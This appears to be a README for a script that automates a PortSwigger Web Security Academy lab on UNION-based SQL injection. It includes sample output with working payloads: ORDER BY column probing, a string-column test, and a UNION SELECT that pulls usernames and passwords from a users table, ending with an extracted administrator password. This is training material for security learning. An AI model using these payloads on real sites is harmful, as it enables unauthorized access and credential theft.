# 🔐 SQL injection UNION attack, retrieving data from other tables

This script is designed to test for basic SQL injection vulnerabilities in labs from PortSwigger's Web Security Academy Lab: [SQL injection UNION attack, retrieving data from other tables](https://portswigger.net/web-security/learning-paths/sql-injection/sql-injection-using-a-sql-injection-union-attack-to-retrieve-interesting-data/sql-injection/union-attacks/lab-retrieve-data-from-other-tables#). It targets endpoints like `/filter?category=` and checks whether a given payload successfully bypasses input validation.

---

## 🚀 How It Works

The script performs the following steps:

1. **Disables SSL warnings** to avoid certificate issues with lab URLs.
2. **Sets up a proxy** (default: `127.0.0.1:8080`) for interception via tools like Burp Suite.
3. **Accepts two arguments**:
   - `url`: The base URL of the lab.
   - `table`: Name of a separate table that needs be used during UNION SQL Injection.
   - `columns`: A list of columns can be passed by the user separated by space.
4. **Constructs the full request URL** by appending the payload to `/filter?category=`.
5. **Sends the request** and use beautiful soup library to fetch the password for administrator
6. **Prints the result** indicating whether the injection was successful.

---

## 🧪 Sample Usage

```bash
python3 unionRetrieveFromOtherTable.py https://0aed00af03273e1580eb30a8009f0001.web-security-academy.net users username password
```

### ✅ Sample Output

```
(+) Targeting: https://0aed00af03273e1580eb30a8009f0001.web-security-academy.net
(+) Determining number of columns using ORDER BY...

    ➤ Testing payload: ' ORDER BY 1--
    ➤ Testing payload: ' ORDER BY 2--
    ➤ Testing payload: ' ORDER BY 3--

(✓) Found error at column 3, so total columns = 2

(+) Testing which of 2 columns accepts string data...

    ➤ Testing payload: ' UNION SELECT 'test123',null--

(✓) Column 1 accepts string data.

(+) Attempting to extract data from table 'users'...

    ➤ Final payload: ' UNION SELECT username,password FROM users--

(✓) Administrator credentials found:

    ➤ Username: administrator
    ➤ Password: arj0eaiquwuuo2bkibqk
```

---

## 📌 Lab-Specific Note

For this particular lab, the script checks whether the response contains the administrator password in a particular html tag using web scraping to determine success. You can modify this logic in the code to match other labs or contexts.

---

## 📦 Requirements

Install dependencies using:

```bash
pip install -r requirements.txt
```

---

## 📦 Walkthrough of the code
[Code Walkthrough](https://medium.com/@adhithyasivanesh/portswigger-web-security-academy-labs-sqli-lab-1-retrieving-hidden-data-fe40ea356d5d)

